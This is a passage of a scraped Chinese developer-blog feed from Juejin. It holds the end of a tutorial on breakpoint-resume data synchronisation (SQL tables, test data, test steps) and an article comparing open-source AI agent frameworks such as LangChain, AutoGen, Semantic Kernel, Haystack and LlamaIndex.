    source <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">200</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    target <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">200</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    last_break_point <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span>,
    status TINYINT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span> COMMENT <span class="hljs-string">'0-未开始 1-同步中 2-已完成 3-异常'</span>,
    create_time DATETIME <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
    update_time DATETIME <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>
);
<span class="hljs-comment">-- 订单表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> order_table (
    id <span class="hljs-type">BIGINT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,
    order_no <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    amount <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    create_time DATETIME <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
    sync_status TINYINT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span> COMMENT <span class="hljs-string">'0-未同步 1-已同步'</span>
);
<span class="hljs-comment">-- 商品表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> product_table (
    id <span class="hljs-type">BIGINT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,
    product_no <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    product_name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    price <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    create_time DATETIME <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
    sync_status TINYINT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span> COMMENT <span class="hljs-string">'0-未同步 1-已同步'</span>
);
</code></pre>
</li>
</ul>
</li>
<li>
<p>插入测试数据：</p>
<ul>
<li>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 订单同步任务</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> sync_task (task_name, task_code, source, target) 
<span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'订单数据同步'</span>, <span class="hljs-string">'order_sync'</span>, <span class="hljs-string">'order_table'</span>, <span class="hljs-string">'warehouse_order'</span>);
<span class="hljs-comment">-- 商品同步任务</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> sync_task (task_name, task_code, source, target) 
<span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'商品数据同步'</span>, <span class="hljs-string">'product_sync'</span>, <span class="hljs-string">'product_table'</span>, <span class="hljs-string">'mall_product'</span>);
<span class="hljs-comment">-- 测试订单数据</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> order_table (order_no, amount) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'ORDER001'</span>, <span class="hljs-number">100.00</span>), (<span class="hljs-string">'ORDER002'</span>, <span class="hljs-number">200.00</span>), (<span class="hljs-string">'ORDER003'</span>, <span class="hljs-number">300.00</span>);
<span class="hljs-comment">-- 测试商品数据</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> product_table (product_no, product_name, price) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'PROD001'</span>, <span class="hljs-string">'手机'</span>, <span class="hljs-number">2999.00</span>), (<span class="hljs-string">'PROD002'</span>, <span class="hljs-string">'电脑'</span>, <span class="hljs-number">5999.00</span>);
</code></pre>
</li>
</ul>
</li>
<li>
<p>启动Nacos、Redis、MySQL，确保服务注册成功；</p>
</li>
</ol>
</li>
<li>
<p><strong>测试步骤</strong>：</p>
<ol>
<li>调用订单同步接口：<code>http://127.0.0.1:8080/sync/start/order_sync</code>，验证断点续传逻辑；</li>
<li>调用商品同步接口：<code>http://127.0.0.1:8080/sync/start/product_sync</code>，验证商品数据同步；</li>
<li>手动中断服务后重启，再次调用接口，验证从断点位置继续同步；</li>
</ol>
</li>
</ol>
<h3 data-id="heading-33">3. 总结</h3>
<h4 data-id="heading-34">关键点回顾</h4>
<ol start="3">
<li>
<p><strong>解耦核心</strong>：通过<code>SyncDataSource</code>和<code>SyncHandler</code>抽象业务差异化逻辑，<code>GenericSyncTemplate</code>封装通用断点续传逻辑，实现“通用逻辑复用，业务逻辑定制”；</p>
</li>
<li>
<p><strong>扩展便捷</strong>：新增业务（如用户数据同步）时，仅需：</p>
<ol>
<li>定义业务实体（UserDO）；</li>
<li>实现<code>SyncDataSource&lt;UserDO&gt;</code>和<code>SyncHandler&lt;UserDO&gt;</code>；</li>
<li>配置同步任务（无需修改通用代码）；</li>
</ol>
</li>
<li>
<p><strong>核心保障</strong>：保留分布式锁（防并发）、幂等（防重复）、断点持久化（Redis+MySQL）、批次同步（防高并发超时）等核心能力，适配分布式高并发场景。</p>
</li>
</ol>
<h4 data-id="heading-35">生产扩展建议</h4>
<ul>
<li>动态配置：通过Nacos配置中心动态调整不同业务的批次大小、重试次数；</li>
<li>监控告警：对接Prometheus+Grafana监控同步进度、断点、失败次数，异常时触发告警；</li>
<li>异步执行：通过Spring Task/XXL-Job实现定时同步，避免接口阻塞；</li>
<li>多数据源适配：扩展<code>SyncDataSource</code>支持MySQL/ES/MongoDB等不同数据源。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[最好用的开源AI智能体（Agent）开发框架对比：LangChain-AutoGen-LlamaIndex等]]></title>    <link>https://juejin.cn/post/7579808521203417122</link>    <guid>https://juejin.cn/post/7579808521203417122</guid>    <pubDate>2025-12-04T08:49:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579808521203417122" data-draft-id="7579814711852662794" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="最好用的开源AI智能体（Agent）开发框架对比：LangChain-AutoGen-LlamaIndex等"/> <meta itemprop="keywords" content="LangChain,LLM,Agent"/> <meta itemprop="datePublished" content="2025-12-04T08:49:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI大模型"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            最好用的开源AI智能体（Agent）开发框架对比：LangChain-AutoGen-LlamaIndex等
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI大模型
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:49:12.000Z" title="Thu Dec 04 2025 08:49:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote>
<p>随着大模型/LLM 与检索、工具调用、记忆、调度等组合使用成为主流，越来越多框架出现以降低构建“会思考、会规划、会调用工具”的智能体（agent）的门槛。下面我以一名 AI 大模型开发专家的视角，列出目前市面上比较受欢迎且成熟的开源框架，说明它们的定位、核心优势、局限，并给出选型建议与对比表，帮助你快速判断哪个最适合你的项目。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98a81c840c34487488163bf814c3353d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442952&amp;x-signature=asBFre5kUVxPMXPJr4rxRDfnr3k%3D" alt="" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-0">一、概览</h3>
<ul>
<li><strong>LangChain</strong> — 以“组装链（chains）/agents/工具集成”著称，生态最广。</li>
</ul>

<p><strong>Microsoft AutoGen</strong> — 面向<strong>多智能体协作</strong>与研究/工程结合的框架（微软开源）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/faeecf450b894db48dde235c14d0833d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442952&amp;x-signature=xUmVsn03k8xOaulREHipVjOcaa4%3D" alt="" loading="lazy"/></p>
<p><strong>Microsoft Semantic Kernel (SK)</strong>  — 微软的 SDK，偏企业级、流程化 agent 与技能（skill）抽象</p>
<p><strong>Haystack（deepset）</strong>  — 以 RAG（检索增强生成）与生产级管道/编排见长，适合文档型应用与问答</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc0a26978fe14040ae454173b21570a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442952&amp;x-signature=zweitOMsGb%2FOaAc2jMVi1UCrLsA%3D" alt="" loading="lazy"/></p>
<p><strong>LlamaIndex（原 GPT-Index）</strong>  — 专注“数据接入 + 索引 + 查询”层，做知识增强与对接大规模数据源非常方便</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbde95aa00da45e19ab9cc924bff5941~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442952&amp;x-signature=4T%2B%2ByKKwc0hcO%2BY3Jb7iyc%2FByhw%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-1">二、几种框架的优缺点比较</h2>
<h4 data-id="heading-2">1.LangChain</h4>
<p><strong>定位与特点</strong> LangChain 是目前最被广泛采用的 agent / LLM 应用框架之一，提供预置 agent 模板、丰富的工具/连接器（向量数据库、API、记忆、工具调用），并在 Python/JS 双生态活跃。它强调“组件可组合性”与快速原型。1</p>
<p><strong>优点</strong></p>
<ul>
<li>生态大、社区活跃、插件/示例非常多（向量 DB、工具、观察/评估平台等）。</li>
<li>上手快：有众多预置 agent 策略（反复思考、链式思考、工具选择器等）。</li>
<li>语言/平台覆盖（Python + JS/TS），适合前后端协作部署。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>框架层抽象很多时会显得“重量级”，复杂生产场景需要精心设计以控制成本/延迟。</li>
<li>由于插件多，版本/兼容性管理可能是工程负担。</li>
</ul>
<p><strong>典型场景</strong>：聊天机器人、任务型 agent、工具调用原型、SaaS 应用 POC。</p>
<h4 data-id="heading-3">2.  Microsoft AutoGen</h4>
<p><strong>定位与特点</strong> AutoGen 是微软推出的面向<strong>多智能体协同</strong>与“agent 编程” 的框架，强调 agent 之间协作、角色分工与分布式执行，适合需要多个 agent 协作/模拟的复杂工作流。微软也在将其与其它 SDK（如 Semantic Kernel）整合或并行发展。</p>
<p><strong>优点</strong></p>
<ul>
<li>原生支持多 agent 协作、对话式任务分解、基于角色的任务分配。</li>
<li>注重工程化（日志、测试、调度）与研究（multi-agent behavior）结合。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>生态与模板相对较新（但增长快），上手曲线对工程化/分布式部署要求高。</li>
<li>重点偏向“多 agent 协作范式”，若只是做单体 RAG agent，可能显得过度。</li>
</ul>
<p><strong>典型场景</strong>：复杂业务流程自动化、多角色协作（如模拟客服+专家+检索员）、研究型多 agent 系统。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c734b84bb114269b367be2704f83719~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442952&amp;x-signature=70buvwlFejlA3qVAlUelRSgY0vs%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-4">3.  Microsoft Semantic Kernel（SK）</h4>
<p><strong>定位与特点</strong> Semantic Kernel 是微软提供的一个模型无关（model-agnostic）SDK，强调<strong>技能（skill）/插件化</strong>、流程化的 agent 架构（适配 .NET / Python），对企业级、生产化集成友好。它更像是把“业务技能、计划、记忆”做成可注册、可复用的模块。</p>
<p><strong>优点</strong></p>
<ul>
<li>结构化思路：技能（functions/skills）抽象清晰，便于企业治理与复用。</li>
<li>支持多语言栈（.NET、Python），与微软生态（Azure）整合度高。</li>
<li>企业级关注点（安全、扩展、运维）较好。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>对偏实验/快速迭代的团队，初始学习成本和工程化投入可能较高。</li>
<li>目前生态仍偏微软/企业方向，社区示例不如 LangChain 丰富。</li>
</ul>
<p><strong>典型场景</strong>：企业级流程自动化、与现有 .NET 系统结合的智能工作流、需要技能治理的场景。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c5de100b44140a0863594eae435f3b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442952&amp;x-signature=Dwl8nukOMBtlIMbbUBga0G7k0MY%3D" alt="" loading="lazy"/></p>
<hr/>
<h4 data-id="heading-5">4.Haystack（deepset）</h4>
<p><strong>定位与特点</strong> Haystack 是面向**RAG（检索增强生成）**与生产级管道的开源框架，擅长把检索、向量数据库、转换器（PDF/Office 等）、生成器拼成可部署的流水线（pipelines / agents）。它定位是“把研究级方法做成工程可用的堆栈”。</p>
<p><strong>优点</strong></p>
<ul>
<li>在检索、索引、QA、文档理解等场景非常成熟（内建多种检索策略与向量 DB 适配）。</li>
<li>支持可序列化的 Pipeline，便于在 Kubernetes 等生产环境部署与监控。</li>
<li>文档处理与企业搜索场景的最佳实践多。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>如果你的目标是“多 agent 协作”或高度自定义的 agent 策略，Haystack 更关注 RAG/管道而非 agent 策略语言。</li>
<li>学习曲线在于理解 Pipeline 与组件契约（但文档较好）。</li>
</ul>
<p><strong>典型场景</strong>：企业知识库问答、文档检索+生成的客服/搜索、需要稳定生产部署的 RAG 服务。</p>
<h4 data-id="heading-6">5.  LlamaIndex</h4>
<p><strong>定位与特点</strong> LlamaIndex 专注把“各种数据源（API、文件、DB、表格）”转成<strong>索引/向量/结构化提示</strong>，让 LLM 可以高效查询与生成。它更像是“知识接入层”（data framework），常与 LangChain、Haystack 等配合使用。</p>
<p><strong>优点</strong></p>
<ul>
<li>提供丰富的数据接入器与索引结构（树/图/混合索引），便于快速把公司数据“喂给”LLM。</li>
<li>非常适合需要复杂检索策略或自定义索引结构的场景。</li>
<li>与其它 agent 框架兼容（可作为知识层独立使用）。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>它不是完整的 agent 编排框架（不提供大量预置 agent 策略），需要和 LangChain/Haystack 等配合。</li>
<li>在纯工具编排/多 agent 协作方面需额外实现。</li>
</ul>
<p><strong>典型场景</strong>：大规模文档/数据库接入、企业知识增强、需要自定义索引结构的查询型应用。</p>
<hr/>
<h2 data-id="heading-7">对比速览表</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07dfb86fd68c4791a747b527b6a77f81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442952&amp;x-signature=t%2FNLNnlJ%2BH2Z4IWgt0HW8LSAe2w%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">三、选型建议（实战向）</h2>
<ul>
<li><strong>想快速做 PoC 或产品原型</strong>：优先选 <strong>LangChain</strong>（丰富模板、示例、工具）。</li>
<li><strong>需要把公司文档/知识库接入并做问答/客服</strong>：先用 <strong>LlamaIndex</strong> 做数据接入/索引，再把它和 <strong>Haystack 或 LangChain</strong> 组合部署。</li>
<li><strong>企业级流程、需要技能管理或与 .NET 深度整合</strong>：优先 <strong>Semantic Kernel</strong>。</li>
<li><strong>场景需要多个“角色”智能体协同（复杂任务分工/仿真）</strong> ：看 <strong>AutoGen</strong>。</li>
</ul>
<h2 data-id="heading-9">落地注意点</h2>
<ol>
<li><strong>指标/可观测</strong>：从一开始把调用延迟、token 消耗、工具调用失败率纳入监控（LangChain/AutoGen 都支持接入监控/评估）。</li>
<li><strong>成本控制</strong>：将复杂推理拆成检索 + 缩短上下文 + 精简提示，优先用 RAG（Haystack/LlamaIndex）。</li>
<li><strong>安全/工具隔离</strong>：任何 agent 调用外部工具（写文件、执行命令）时务必做权限与输入校验。</li>
<li><strong>组合使用</strong>：实际产品里常见组合：<strong>LlamaIndex（数据层）+ LangChain（agent 层）+ Haystack（检索管道或替代）</strong> 。这三者经常互补。</li>
</ol>
<h3 data-id="heading-10">学习资源推荐</h3>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从MiniMax到DeepSeek：为何头部大模型都在押注「交错思维」？]]></title>    <link>https://juejin.cn/post/7579800429376208946</link>    <guid>https://juejin.cn/post/7579800429376208946</guid>    <pubDate>2025-12-04T08:49:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579800429376208946" data-draft-id="7579628944037314569" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从MiniMax到DeepSeek：为何头部大模型都在押注「交错思维」？"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2025-12-04T08:49:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="机器之心"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从MiniMax到DeepSeek：为何头部大模型都在押注「交错思维」？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    机器之心
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:49:18.000Z" title="Thu Dec 04 2025 08:49:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
